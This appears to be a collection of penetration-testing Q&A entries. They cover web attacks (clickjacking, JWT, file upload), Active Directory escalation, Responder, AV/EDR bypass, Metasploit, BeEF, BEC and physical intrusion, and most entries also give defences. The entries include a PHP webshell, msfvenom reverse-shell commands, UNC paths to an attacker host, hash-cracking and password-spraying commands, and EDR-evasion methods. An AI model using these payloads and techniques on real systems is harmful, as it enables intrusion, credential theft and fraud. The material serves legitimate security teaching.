Clickjacking: attacker overlays invisible iframe over legitimate site; victim thinks clicking on attacker page but actually clicking on legitimate site beneath; triggers actions on legitimate site as authenticated user. Classic attack: CSS overlays target site iframe (opacity: 0; position: absolute; z-index: 1000); attacker page underneath has enticing button; victim clicks attacker button; click passes through to iframe; submits form, approves OAuth, deletes account, changes email on legitimate site. Requirements: target site must allow framing (no X-Frame-Options or CSP frame-ancestors); target action must be performable by authenticated click (not requiring text input -- though some attacks trick text entry too). Variations: Likejacking: overlay invisible Facebook Like button; victim inadvertently likes content. Cursorjacking: replace cursor image with offset cursor; victim clicks where cursor appears but click registered elsewhere. Multi-step: multiple invisible overlays for multi-step confirmations. Drag-and-drop: trick user into dragging selected text into attacker frame (exfiltrate selected token). Filejacking: trick browser into selecting file from filesystem via drag-and-drop. Defense: X-Frame-Options header: DENY (no framing); SAMEORIGIN (same origin only); ALLOW-FROM uri (specific origin -- deprecated, not supported by Chrome). CSP frame-ancestors: frame-ancestors 'none' (no framing); frame-ancestors 'self' (same origin); more flexible than X-Frame-Options; frame-ancestors 'self' https://partner.com (whitelist). JavaScript frame-busting: if (top !== self) { top.location = self.location; } -- breakout of iframe; weaker defense (can be bypassed with sandbox iframe). Modern recommendation: use CSP frame-ancestors in Content-Security-Policy header (X-Frame-Options maintained for IE compatibility). SameSite cookies: SameSite=Lax or Strict prevents session cookie from being sent in cross-origin iframe requests; fundamentally mitigates clickjacking for authenticated actions.
How does HTTP Strict Transport Security (HSTS) work?

HSTS (HTTP Strict Transport Security): security mechanism forcing browsers to use HTTPS for all connections to a domain for a specified time period. How it works: server sends response header: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload; browser stores HSTS policy for domain; for max-age seconds, browser automatically upgrades all HTTP requests to HTTPS without contacting server; browser refuses connections that present invalid certificate (no click-through for certificate error). Parameters: max-age: seconds to enforce HTTPS; 31536000 = one year (recommended); includeSubDomains: applies policy to all subdomains (ensure all subdomains have valid HTTPS or policy breaks them); preload: signal to be added to browser HSTS preload list. HSTS preload: hardcoded list of domains that always use HTTPS before first visit; eliminates first-visit vulnerability; submit via hstspreload.org; once added, very difficult to remove; ensure HTTPS working perfectly before submitting. Protections: prevents SSL stripping attack: attacker performs MitM; downgrades HTTPS to HTTP (SSLstrip); captures credentials in cleartext; HSTS prevents browser from accepting downgrade. First-visit vulnerability: without preload, first visit might be HTTP (before HSTS header received); attacker can intercept first visit; preload eliminates this. Bypasses: if max-age expired: temporary downgrade possible; clear HSTS data: browser HSTS state stored locally; victim on fresh browser without preload = vulnerable; network-level MitM before HSTS received. Testing: curl -I https://target.com | grep Strict; check max-age value; check includeSubDomains; verify preload submission. Common mistakes: short max-age (too short to protect); forgetting includeSubDomains (subdomain HTTP leaks session via Referer); serving HSTS header on HTTP response (ignored by browsers -- only valid on HTTPS response); HTTPS with invalid certificate (browser rejects, HSTS still blocks HTTP downgrade -- site becomes inaccessible).
What is cookie security and how do you test for cookie vulnerabilities?

Cookie security attributes and vulnerabilities: Secure flag: cookie only sent over HTTPS; without Secure: cookie sent over HTTP; if any HTTP page on domain: cookie visible to network observer; test: create HTTP request to domain; check if session cookie transmitted. HttpOnly flag: cookie inaccessible to JavaScript (document.cookie); prevents XSS from stealing session cookie; without HttpOnly: XSS can steal session; test: document.cookie in console -- session cookie should not appear. SameSite attribute: controls when browser sends cookie in cross-origin requests; SameSite=Strict: cookie never sent on cross-origin requests (even top-level navigation); SameSite=Lax: cookie sent on cross-origin top-level navigations (link click) but not subrequests (iframe, AJAX); default in Chrome 80+; SameSite=None: sent on all requests; requires Secure flag. Domain attribute: specifies which hosts can receive cookie; domain=.example.com allows all subdomains; subdomain cookie can shadow parent cookie (cookie order attack); subdomain injection: if any subdomain is XSS-vulnerable, can set cookie on parent domain (if domain attribute allows). Path attribute: restricts cookie to path prefix; weak protection (easy to bypass with different path). Cookie scope attacks: cookie bomb: set large number of cookies for domain; subsequent requests exceed server header size limit; DoS. Cookie tossing: from subdomain, set cookie with explicit domain (domain=.example.com); parent domain application receives both session cookie and attacker-set cookie; if application uses first matching cookie: session confusion. Session fixation: attacker obtains session ID before auth; sends session ID to victim (via URL or cookie set in XSS); victim logs in; session ID now authenticated; attacker uses pre-known session ID to access authenticated session. Testing tools: cookie editor browser extension; check all session cookies for Secure, HttpOnly, SameSite in browser devtools Application tab; Burp passive scanner flags missing cookie attributes.
How do you exploit insecure file upload functionalities?

File upload security testing: upload functionality allows users to send files to server; wide attack surface. Unrestricted upload to web root: upload PHP file (webshell: <?php system($_GET[cmd]);?>) saved to web-accessible directory; navigate to /uploads/shell.php?cmd=id -- RCE. Extension bypass techniques: if blacklist used: PHP: try.pHp,.php5,.php7,.phtml,.pht,.php.jpg (double extension), php%00.jpg (null byte truncation -- older servers); ASP:.asp,.aspx,.asa,.asax,.ashx,.asmx; JSP:.jsp,.jspx,.jsw,.jsv,.jspf. Content-type bypass: server checks Content-Type header not actual content; send Content-Type: image/jpeg with PHP file; server accepts image, stores PHP, executes when accessed. Magic bytes bypass: server checks file signature (magic bytes); prepend valid JPEG magic bytes (FFD8FF) before PHP code; file passes magic byte check but PHP parser executes code after bytes. Malicious content types: SVG upload: <?xml version='1.0'?><svg xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>; if server renders SVG: stored XSS. ImageMagick: if server uses ImageMagick to process images: ImageTragick (CVE-2016-3714) via polyglot image with embedded ImageMagick commands. PDF upload: upload PDF with embedded JavaScript; executed in browser PDF viewer context (limited). ZIP/archive: Zip Slip attack: archive with path-traversal filename (../../../etc/cron.d/backdoor); unzip into web root; overwrite files outside intended directory. Defence: store uploads outside web root (not accessible via URL); rename file (UUID filename removes attacker-chosen extension); validate content server-side (magic bytes + image re-processing to destroy embedded code); serve from separate domain (images.example.com) without execution capability; allowlist extensions (only jpg, png, gif -- not php); use CDN for serving user content.
How do you test JSON Web Tokens (JWT) for vulnerabilities?

JWT (JSON Web Token) security testing: JWTs are base64-encoded header.payload.signature; used for authentication and authorisation. Structure: header (alg, typ). payload (claims: sub, iat, exp, role, etc.). signature; all base64url-encoded. Vulnerabilities: (1) Algorithm None attack: change header alg to none; remove signature; server accepts unsigned token if does not validate alg claim; test: decode token; change alg to none; remove signature (keep trailing dot); send modified token. (2) Algorithm confusion (RS256 to HS256): if server uses RS256 (asymmetric, signs with private key, verifies with public key); change alg to HS256 (HMAC-SHA256, symmetric); sign token with RSA public key as HMAC secret; server may use public key (which is public/known) to verify HMAC signature; full token forgery. (3) Weak secret cracking: HS256 HMAC signed with weak secret; hashcat -m 16500 jwt.txt rockyou.txt (JWT attack mode); or john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt; if secret cracked: forge any claims. (4) Payload tampering without signature check: some implementations validate signature but do not require it (libraries with permissive settings); or skip validation in development mode not disabled in production. (5) jku/x5u header injection: jku header specifies URL of JWKS (JSON Web Key Set) for signature verification; if server fetches jku without validation: point to attacker-controlled JWKS; sign token with attacker private key; server fetches attacker JWKS and validates with attacker public key -- forged claims accepted. (6) kid (Key ID) injection: kid parameter selects which key to use; if kid used in SQL query or filesystem path: SQLi or path traversal; kid=../../../../dev/null (empty file) for null byte HMAC secret = predictable. (7) Expired token acceptance: check if server enforces exp claim; replay expired tokens. Tools: jwt.io (decode/encode); jwt_tool (automated JWT security testing); Burp JWT Editor extension; hashcat for cracking HS256 secrets.
What is Business Email Compromise (BEC) and how is it executed?

BEC (Business Email Compromise): sophisticated fraud targeting organisations via email impersonation; FBI IC3 reports $2.9B in losses in 2023 (largest cybercrime category by financial loss). Types: (1) CEO Fraud: attacker impersonates CEO or CFO; emails finance team (AP department); urgently requests wire transfer for confidential acquisition, tax payment, or vendor payment; pressure + urgency + confidentiality discourages verification; transfers to attacker-controlled accounts. (2) Vendor impersonation: attacker compromises or impersonates vendor/supplier email; sends invoice with updated bank account details; company pays attacker account instead of real vendor. (3) Account compromise (true BEC): attacker actually compromises email account (via phishing, credential stuffing); monitors email for financial discussions; inserts at opportune moment (when pending payment discussed) with realistic bank account change request; most convincing. (4) Payroll diversion: impersonate employee; email HR/payroll requesting direct deposit account change; next payroll goes to attacker. (5) Attorney impersonation: legal matter framing; impersonate attorney; claim pending legal requirement for immediate confidential transfer. Execution: domain spoofing (Display Name spoof: CEO Name <attacker@gmail.com>); lookalike domain (conpany.com vs company.com); email header manipulation; Reply-To hijack (from: ceo@company.com but Reply-To: ceo@company-legit.net). Technical enablement: O365 compromise via phishing -> monitor inbox -> inbox rules to forward financial emails; trigger at right moment. Defense: DMARC (Domain-based Message Authentication, Reporting, and Conformance): p=reject prevents domain spoofing; SPF and DKIM validate legitimate sending; out-of-band verification policy: call vendor on known number (not number in email) to verify any payment change; dual approval for wire transfers above threshold; employee training -- verify before wiring.
How do you assess physical security during a red team engagement?

Physical security assessment: test whether physical controls prevent unauthorised access to sensitive areas. Reconnaissance: satellite imagery (Google Maps); public photos (LinkedIn, company website showing office layout, badge designs, reception area); dumpster diving (find discarded documents, network diagrams, employee lists, old IT equipment); social media employee photos revealing badge design, office layout, security equipment. Attack techniques: (1) Tailgating / Piggybacking: follow authorised person through controlled access point; professional attire and confident demeanor; timing: busy commute periods, coffee runs, deliveries; carrying large item (boxes, laptop bag) -- people hold doors. (2) Impersonation: IT support (uniform, fake ID, IT equipment); fire inspector (government ID, clipboard); delivery driver (uniform, package); vendor (visitor badge from previous visit or replica); maintenance worker. (3) Badge cloning: RFID/HID card readers easy to clone; Proxmark3 device reads card at distance (elevator, crowded area); clone to blank card; replay to gain access. (4) Lock picking: mechanical lock bypass; lock picks + tension wrench; practice on training locks; many corporate interior locks are low-security. (5) Bypass techniques: door shim (credit card or shim opens spring latches); under-door tool (hook cable under door, flip lever handle from inside); crash bar bypass; hinge pin removal. (6) Dumpster diving: find network diagrams, credentials, internal phone lists, IT asset tags (useful for social engineering), old hard drives with data. Deliverables: document access achieved; photos as evidence; timeline of access; assessment of what could have been stolen or compromised; recommendations: tailgate detection (man-trap airlocks, security awareness training); access control review; RFID card replacement with higher frequency cards (HID iClass Seos harder to clone); camera coverage.
What are common techniques for domain privilege escalation after initial access?

Post-initial-access domain privilege escalation path: Initial position: low-privilege domain user on workstation. Phase 1 -- Local privilege escalation: if not local admin: run WinPEAS or PrivescCheck; common paths: SeImpersonatePrivilege (IIS, SQL Server, Exchange service accounts -- Potato attacks); weak service binary permissions; AlwaysInstallElevated. Phase 2 -- Credential access from local system: if local admin: Mimikatz sekurlsa::logonpasswords (cached credentials in LSASS); Mimikatz lsadump::sam (local account hashes); check if domain admin has active session (query loggedon users); Autoruns + scheduled task review for additional credentials. Phase 3 -- Lateral movement to higher-value system: PtH or credential reuse to other local systems; spray cracked local admin password across network (CrackMapExec cme smb 10.0.0.0/24 -u admin -p Password1 --local-auth); find system with domain admin session; move there. Phase 4 -- Domain credentials: from system with admin session: dump domain credentials via Mimikatz; OR from any domain-joined system with domain admin access: DCSync (lsadump::dcsync). Phase 5 -- Domain compromise: krbtgt hash obtained; Golden Ticket created; persistent domain control. Faster paths: Kerberoasting directly from initial low-priv user (no escalation needed first); AS-REP Roasting (requires no credentials if target has pre-auth disabled); BloodHound shortest path from current position; AD CS ESC1 (enrol certificate as domain admin from any user if template misconfigured). Time-to-domain admin benchmarks: well-secured domain: weeks to months; typical corporate: 1-5 days; common misconfigured environments: hours. Tools: BloodHound (attack path visualisation); Impacket suite; CrackMapExec; PowerView/SharpView; Rubeus (Kerberos attacks in pure.NET).
How do you test for race conditions in web applications?

Race conditions (Concurrent Request vulnerabilities): when application processes concurrent requests and has a Time-of-Check to Time-of-Use (TOCTOU) window; multiple simultaneous requests can each pass a check that should only allow one to proceed. Classic example: e-commerce gift card redemption: check if card has balance (check); deduct balance (action); two simultaneous requests both pass check before either updates balance; both redeem successfully (double redemption). Testing methodology: identify state-dependent operations: gift card/voucher redemption; discount code application (one-use codes); account credit spending; limited inventory purchase; file uploads that check quota; voting/liking systems that should limit to one per user. Burp Suite Race Condition testing: Turbo Intruder extension: send requests using HTTP/2 connection; single-packet attack (send all requests in single TCP packet); ensures simultaneous server arrival; eliminates network jitter. Example Turbo Intruder script: def queueRequests(target, wordlists): engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2); for i in range(20): engine.queue(target.req); engine.start(timeout=10). Outcomes: check logs/database for multiple successful operations; race window as small as microseconds -- requires simultaneous delivery (single-packet attack ensures this). More targets: parallel registration with same email (two accounts created); password reset token race (two valid tokens); privilege check bypass (simultaneous operations that each assume other hasn't happened). Limit bypass races: check rate limiting by sending identical requests in parallel; if rate limit checked before counter incremented -- bypass. Defence: database-level locking (SELECT FOR UPDATE); atomic operations (Redis INCR -- atomic counter); idempotency keys (unique key per operation, reject duplicate keys -- prevents double-redemption even with race); distributed locking (Redis Redlock for distributed systems). Burp Suite 2023 added native race condition testing in Repeater (Send in parallel group).
What is Responder and how do you use it for credential capture?

Responder: LLMNR/NBT-NS/mDNS poisoner and credential capture tool; exploits Windows name resolution fallback mechanisms. Background: Windows name resolution order: (1) Local hosts file; (2) DNS; (3) LLMNR (Link-Local Multicast Name Resolution -- UDP 5355 multicast); (4) NBT-NS (NetBIOS Name Service -- UDP 137 broadcast); LLMNR and NBT-NS are LAN-only; no authentication of responses -- Responder answers all queries claiming to be every host. Running Responder: responder -I eth0 -rdwv (I=interface, r=NBT-NS A record, d=DNS, w=WPAD, v=verbose); automatically listens on LLMNR, NBT-NS, mDNS; creates fake servers: HTTP, HTTPS, SMB, FTP, POP, IMAP, SMTP, LDAP; when Windows host fails DNS resolution and broadcasts LLMNR: Responder answers with attacker IP; victim connects to attacker fake server (SMB, HTTP); credentials captured as NTLMv2 hash. Captured format: NTLMv2 hashes (hashcat mode 5600; cannot be used for PtH -- must crack); crack with hashcat: hashcat -m 5600 captured.txt rockyou.txt -r rules/best64.rule. WPAD (Web Proxy Auto-Discovery): Windows browsers search for proxy configuration via WPAD; broadcast WPAD name; Responder answers; serves malicious WPAD.dat requiring authentication; captures credentials of all browsers on network. Combined attack (Responder + NtlmRelayX): use Responder with --no-smb-server --no-http-server (avoid conflicts); ntlmrelayx handles SMB/HTTP relay instead; relay hashes to targets rather than just capturing. Trigger mechanisms: wait passively (any failed name resolution); or trigger: access UNC path with typo (\typoedserver\share from browser address bar); deploy URL file in shared folder with icon path pointing to attacker IP (\attacker\logo.ico); SCF file (shell command file) in file share with IconFile=\\attacker\share\icon.ico -- auto-triggered when folder opened in Explorer. Detection: Event 4776 (NTLM authentication from unexpected source); network alert on LLMNR/NBT-NS responses from non-DNS servers.
How do you bypass antivirus and EDR with custom malware?

AV/EDR bypass techniques: Static bypass (beat signature scanning): (1) Custom encoding/encryption: XOR payload with random key; decrypt in memory at runtime; no static signature matches encrypted blob; key embedded in loader. (2) Payload staging: initial dropper downloads stage-2 payload at runtime; URL changes frequently; no stage-2 in dropper binary; AV cannot detect payload not present at scan time. (3) String obfuscation: encrypt strings (API names, C2 domains) at compile time; decrypt at runtime; avoid obvious strings like VirtualAlloc, CreateRemoteThread in PE. (4) Import table obfuscation: do not import suspicious APIs directly; use GetProcAddress at runtime with obfuscated function names; load from LoadLibrary manually; hashing API names (compare hash of function name not string). Behavioural bypass (beat EDR hooks): (1) Direct syscalls: EDR hooks user-mode API (NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx in ntdll.dll); bypass by calling syscalls directly without going through ntdll; extract syscall numbers (SSN) from ntdll at runtime; use inline ASM for syscall instruction; SysWhispers2/3 automates direct syscall shellcode generation. (2) Unhooking ntdll: overwrite hooked ntdll functions with clean copies from disk; read ntdll from disk or KnownDlls; copy clean.text section over hooked version in memory; all subsequent API calls bypass hooks. (3) Process injection into trusted processes: inject into signed Microsoft processes (explorer.exe, svchost.exe, notepad.exe); some EDRs exempt certain trusted processes from full monitoring. (4) PPID spoofing: set parent process ID of new process to explorer.exe; parent-child relationship anomaly rules in EDR evaded. (5) Thread pool execution: queue shellcode via NtQueueApcThreadEx or similar without CreateRemoteThread signature. (6) ETW patching: Event Tracing for Windows provides telemetry to EDR; patch ETW in-process by overwriting EtwEventWrite function with RET instruction; blinds ETW-dependent EDR telemetry.
What is the OWASP Top 10 and how has it changed?

OWASP Top 10 (2021): A01 Broken Access Control (was A05 2017): most prevalent vulnerability in tested applications; includes IDOR, privilege escalation, missing authorisation, CORS misconfiguration; 94% of applications tested had access control failures. A02 Cryptographic Failures (was A03 Sensitive Data Exposure 2017): refocused on root cause (poor cryptography) not symptom; inadequate encryption, weak algorithms, hardcoded keys, cleartext transmission. A03 Injection (was A01 2017): SQL injection, NoSQL injection, OS command injection, LDAP injection; dropped from #1 as frameworks provide better auto-parameterisation; XSS moved into this category (now called Cross-site Scripting under injection). A04 Insecure Design (NEW 2021): design-phase security flaws; threat modeling needed; abuse cases not considered; business logic vulnerabilities; no amount of secure coding fixes an insecure design. A05 Security Misconfiguration (was A06 2017): cloud misconfigurations, default credentials, unnecessary features enabled, verbose error messages, missing security headers; includes XML External Entities (was A04 2017) merged here. A06 Vulnerable and Outdated Components (was A09 2017): using unpatched libraries, frameworks, OS; Log4Shell (CVE-2021-44228) perfect example; SCA tools (Snyk, Dependabot) address this. A07 Identification and Authentication Failures (was A02 Broken Authentication 2017): weak passwords, no MFA, credential stuffing, weak session management, missing rate limiting on login. A08 Software and Data Integrity Failures (NEW 2021): insecure deserialisation merged here; CI/CD pipeline integrity; software update without signature verification; supply chain attacks (SolarWinds). A09 Security Logging and Monitoring Failures (was A10 2017): insufficient logging means breaches go undetected; PCI DSS requires logging; SIEM integration; incident response depends on logs. A10 Server-Side Request Forgery (NEW 2021): SSRF added as community-requested entry; cloud metadata access; internal service access; high severity in cloud environments.
How do you scan for vulnerabilities with Nessus?

Nessus: widely-used commercial vulnerability scanner; plugins (170,000+) check for known CVEs, misconfigurations, default credentials, missing patches. Setup: install Nessus on scanning host; activate with license (Nessus Essentials free for 16 IPs; Professional paid); download plugins; access via browser at https://localhost:8834. Scan policies: Basic Network Scan: unauthenticated; identifies open services and known vulnerabilities from banner/version; less accurate (many false positives and false negatives -- cannot see patch level without credentials). Credentialed Scan: provide credentials (Windows domain credentials, SSH key for Linux); Nessus logs in and checks installed software versions, patches, registry settings; much more accurate; significantly more findings. Advanced Scan: customise every option (port ranges, scan speed, plugin families enabled/disabled). Windows credentials: provide domain or local admin credentials; Nessus uses SMB/WMI to query installed patches; ensure Windows Firewall allows WMI (Nessus config wizard shows requirements). Linux credentials: SSH credentials (username + password or key); Nessus runs commands remotely to check packages, configurations. Scan types: External perimeter: scan from internet or DMZ against external IPs; Internal network: from inside corporate network; Web Application Scan: limited web app scanning (Nikto-like); compliance audit: CIS, DISA STIG, PCI DSS, SOX policy checks (paid). Results: Critical, High, Medium, Low, Informational; each finding: CVE number, CVSS score, description, solution, plugin output; export to PDF/HTML/CSV. Common scan issues: false positives (verify with manual testing or PoC); rate limiting causing scan timeouts (throttle scan speed); firewalls blocking scan traffic; credentialed scan login failures (check credential configuration); differences between scan profiles. Post-scan workflow: prioritise Critical and High (especially those with public exploits -- ExploitDB, Metasploit module available); verify critical findings before reporting; track remediation progress with delta scans.
What is vulnerability management and how do you build a program?

Vulnerability management program: systematic process for identifying, evaluating, treating, and reporting security vulnerabilities across organisation. Program components: (1) Asset inventory: know what you have; CMDB (Configuration Management Database); auto-discovery via network scanning; cloud asset inventory (AWS Config, Azure Resource Graph); shadow IT discovery; categorise: critical assets vs standard assets. (2) Scanning: Nessus, Qualys, Rapid7 InsightVM for network scanning; DAST for web applications; SCA (Snyk, Dependabot) for code dependencies; container image scanning (Trivy, Snyk); cloud misconfiguration scanning (Prisma Cloud, Wiz, Lacework); scan frequency: critical assets: weekly; standard: monthly; code: every commit. (3) Prioritisation: CVSS score as starting point but insufficient alone; EPSS (Exploit Prediction Scoring System): ML-based probability of exploitation in next 30 days; KEV (CISA Known Exploited Vulnerabilities): already exploited in wild -- patch immediately; business context: vulnerability on internet-facing payment system vs internal test server; asset criticality multiplies risk score. (4) Remediation SLAs: Critical (KEV): 7 days or immediate; Critical (non-exploited): 15 days; High: 30 days; Medium: 90 days; Low: best effort; track compliance against SLAs. (5) Exceptions: some vulnerabilities cannot be patched (legacy system, vendor won't patch, compensating control implemented); formal exception process: document risk, compensating controls, review date; approved by CISO or risk committee. (6) Reporting: metrics: mean time to remediate by severity; % of assets scanned; vulnerability density (vulns per asset); trend over time; executive dashboard; engineering team progress reports; compliance posture (PCI DSS 6.3.3 requires scanning). (7) Integration: ticket creation in Jira/ServiceNow automatically; link scanner findings to CI/CD pipeline (block deployment if Critical unfixed); SIEM correlation (is unpatched vuln being actively exploited?).
How do you perform a social engineering assessment?

Social engineering assessment: test human and process controls against manipulation attacks. Types: (1) Phishing campaign: send simulated phishing emails to employees; track: open rate, click rate, credential submission rate, report rate; use GoPhish (open-source phishing framework) or commercial (KnowBe4, Proofpoint); realistic pretexts: IT password reset, HR benefits enrollment, document signature (DocuSign); measure and compare to previous campaigns; employees who fail = mandatory training. (2) Spear phishing: highly targeted email to specific individuals (executives, finance team); personalised with OSINT (name, role, recent news about company); more sophisticated; used in red team engagements targeting specific objectives. (3) Vishing (voice phishing): call employees impersonating IT helpdesk, vendor, bank, auditor; attempt to obtain credentials, sensitive information, or persuade actions (wire transfer, security exception); social engineering over phone; script prepared but improvise based on responses; test: does employee verify caller identity? Does helpdesk give password reset without verification? (4) Smishing: SMS phishing; link to fake login page; used for mobile credential theft; SMS sender ID spoofing. (5) Physical social engineering: pretexting for tailgating; impersonation (see physical security section). Pretext examples: IT support (urgent security update, account locked, VPN issue); vendor (delivery, maintenance); executive (CEO calls finance to wire money -- vishing BEC simulation). Legal and ethical requirements: written authorisation with explicit scope; list of out-of-scope scenarios (health, personal life); de-escalation procedures; never psychologically harm targets; anonymous reporting so employees not shamed publicly. Results: percentage of employees who clicked, submitted credentials, reported; qualitative findings from vishing calls (what information disclosed?); recommendations: training, process changes (callback verification for wire transfers), technical controls (email gateway, phone verification systems).
How do you detect and respond to a ransomware attack in progress?

Ransomware incident response: early detection and containment minimise damage. Detection: EDR alert: mass file rename, encryption pattern, shadow copy deletion, process masquerading; SIEM alert: vssadmin delete shadows, bcdedit.exe /set recoveryenabled no (disabling recovery); Honeypot files: decoy files with audit SACL in sensitive directories; any modification triggers alert; ransomware will encrypt them triggering immediate alert; File integrity monitoring on critical servers: tripwire or Wazuh FIM detects unexpected changes. Initial response: Isolate immediately: disconnect affected hosts from network (VLAN isolation, EDR network isolation, physically disconnect); do NOT shutdown (volatile memory contains encryption key, process info); preserve memory before isolation if possible (WinPmem on running system). Scope determination: identify all affected systems; determine ransomware family (extension, ransom note) -- search ID Ransomware (id-ransomware.malwarehunterteam.com) or Nomoreransom.org for decryptors; identify patient zero (how did it enter?); identify extent of lateral movement before encryption started. Recovery: priority 1: restore from backup (test backup integrity before incident -- known-good backup from before infection date; offline/immutable backup critical); priority 2: check for available decryptor (some ransomware families have decryptors released after law enforcement operations -- NoMoreRansom.org); priority 3: negotiate (if no backup and no decryptor -- engage ransomware negotiation expert). Do NOT pay immediately: check sanctions (OFAC list -- some ransomware groups are sanctioned; paying = illegal); backup may exist you don't know about; decryptor quality varies even after payment. Post-incident: incident timeline reconstruction; identify entry vector (phishing email? VPN credential? Exposed RDP?); patch vector; harden against lateral movement (segment, credential hygiene); tabletop exercise learnings; review backup testing cadence.
What are common ways passwords are compromised and how do you protect them?

Password compromise vectors and defences: Phishing: fake login page captures credentials; most common method; defence: hardware MFA (FIDO2/WebAuthn passkeys -- phishing-resistant; phishing page cannot replay authentication); security awareness training. Credential stuffing: using username/password pairs from previous breaches against other sites; credential lists purchased on dark web; defence: unique password per site (password manager); breach monitoring (HaveIBeenPwned API; monitor for employee emails in breach dumps); rate limiting and CAPTCHA on login; MFA. Brute force / password spraying: try common passwords against many accounts; password spraying avoids lockout (one attempt per account per period); defence: account lockout policy; rate limiting; Conditional Access blocking logins from unusual locations. Keylogger: malware records keystrokes; all passwords typed captured; defence: MFA (captured password still not enough); EDR to detect keylogger installation; password manager auto-fill (keyboard-based keylogger may miss auto-fill depending on implementation). Shoulder surfing: physical observation; defence: privacy screen; keyboard covers; lock screen in public. Database breach: site stores passwords and suffers data breach; if poorly stored (MD5, SHA1 unsalted) -- easily cracked; defence as site owner: argon2id, bcrypt, or scrypt with high work factor + salt; as user: unique passwords so breach of one site doesn't expose others. Password cracking: Hashcat with GPU: MD5 hashes at 100 billion/second; bcrypt at 10,000/second (work factor dependent); defence: strong hashing (bcrypt cost factor 12 or argon2id with high memory cost); minimum 12-character password policy; enable length > 64 to prevent brute-force; have I been pwned integration to block common passwords (NIST SP 800-63B recommends checking against breach corpus). Password manager: KeePass (local), Bitwarden (open-source cloud), 1Password (commercial); enables unique 20+ character random passwords per site; master password + hardware MFA only requirement. Passkeys: FIDO2 WebAuthn replaces passwords with public-key cryptography + biometric; phishing-resistant by design; no password to steal; increasingly supported by major sites.
Explain security misconfigurations in cloud storage (S3, Azure Blob, GCS).

Cloud storage misconfiguration: public buckets/containers expose sensitive data to internet. AWS S3 public access: historically: bucket ACL + bucket policy controlled access; by default buckets could be made public; 2023 AWS enabled S3 Block Public Access by default for new buckets; before: thousands of buckets exposed. Checking S3 access: aws s3api get-bucket-acl --bucket BUCKET-NAME; aws s3api get-bucket-policy --bucket BUCKET-NAME; unauthenticated: curl https://BUCKET.s3.amazonaws.com/ (XML listing if public); tools: S3Scanner, bucket-stream, AWSBucketDump; enumerate bucket names by guessing common patterns (company-name-backup, company-dev-config, company-name-logs). What was found: configuration files with database credentials; backup archives with customer data; source code repositories; private keys and certificates; CI/CD environment variables; internal documents. Azure Blob Storage: containers can be Anonymous (public), Blob (public blobs, list private), Container (list + blob public), Private; check: az storage container show-permission --account-name ACCOUNT --name CONTAINER; enumerate: https://ACCOUNT.blob.core.windows.net/CONTAINER?restype=container&comp=list (if public listing enabled). GCS (Google Cloud Storage): legacy fine-grained ACLs allow allUsers or allAuthenticatedUsers read access; uniform bucket-level access introduced to simplify; check: curl https://storage.googleapis.com/BUCKET/ (XML listing if public); gsutil iam get gs://BUCKET-NAME. Finding exposed buckets: Google dork: site:s3.amazonaws.com confidential password; grep through GitHub for bucket references; CommonCrawl dataset search; bucket brute-forcing tools with wordlists of company names. Defense: S3 Block Public Access (account-level setting); bucket policy requiring HTTPS (aws:SecureTransport); AWS Config rules for public bucket detection; CloudTrail logging of all S3 access; Macie for sensitive data discovery in S3; Azure Defender for Storage; principle of least privilege for bucket IAM.
How do you use Metasploit for exploitation?

Metasploit Framework: open-source penetration testing platform; exploit modules, payloads, encoders, post-exploitation modules. Basic workflow: msfconsole (start console); search type:exploit name:eternalblue (search modules); use exploit/windows/smb/ms17_010_eternalblue (select module); show options (list required options); set RHOSTS 192.168.1.10 (set target); set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.50; set LPORT 4444; exploit (or run). Payloads: staged vs stageless: staged (windows/x64/meterpreter/reverse_tcp) -- small stager connects back, downloads full payload -- smaller initial payload; stageless (windows/x64/meterpreter_reverse_tcp) -- full payload in one -- no callback for stage. Meterpreter (post-exploitation shell): sysinfo (system information); getuid (current user); getsystem (attempt privilege escalation); hashdump (dump SAM hashes); shell (drop to system shell); upload/download (transfer files); migrate PID (move to another process -- more stable; migrate to explorer.exe); background (background session); sessions -l (list sessions); sessions -i 1 (interact with session 1). Modules: auxiliary/scanner/smb/smb_ms17_010 (scan for EternalBlue without exploiting); auxiliary/scanner/portscan/tcp; post/windows/gather/credentials/credential_collector; post/multi/manage/shell_to_meterpreter (upgrade shell to meterpreter). MSFVenom: generate payloads standalone: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o payload.exe; msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf > shell.elf; encoders for AV evasion: -e x86/shikata_ga_nai -i 5 (5 iterations -- increasingly detected by modern AV). Database: msfdb init; hosts, services, vulns commands; import nmap XML; correlate scan results with exploits.
What is BeEF (Browser Exploitation Framework) and what can it do?

BeEF (Browser Exploitation Framework): web application security assessment tool targeting browser vulnerabilities; demonstrates impact of XSS attacks. Architecture: BeEF hook (beef.js) -- JavaScript loaded in victim browser via XSS or social engineering; communicates back to BeEF C2 server; enables real-time browser control. Capabilities: (1) Fingerprinting: browser type/version; OS; plugins; screen resolution; timezone; installed software (via plugin probing); browser history (CSS history hack). (2) Network reconnaissance: port scan internal network from victim browser (JavaScript XMLHttpRequest to internal IPs -- bypass firewall as requests originate from victim machine on internal network); ping sweep; detect internal services. (3) Social engineering: fake login dialogs (browser-styled); redirect to phishing page; fake browser update notification with malware download; persistent XSS to hook multiple victims from same page. (4) Metasploit integration: BeEF bind to Metasploit; browser exploit modules; Java exploit; PDF exploit via browser. (5) Keystroke logging: capture keystrokes in browser; steal passwords entered on page. (6) Webcam/microphone: request getUserMedia (requires user permission but crafted UI can trick user). (7) Clipboard theft: paste clipboard content via JavaScript execCommand. (8) Geolocation: request GPS location via browser API. (9) Cookie theft: steal accessible cookies (non-HttpOnly); send to BeEF.
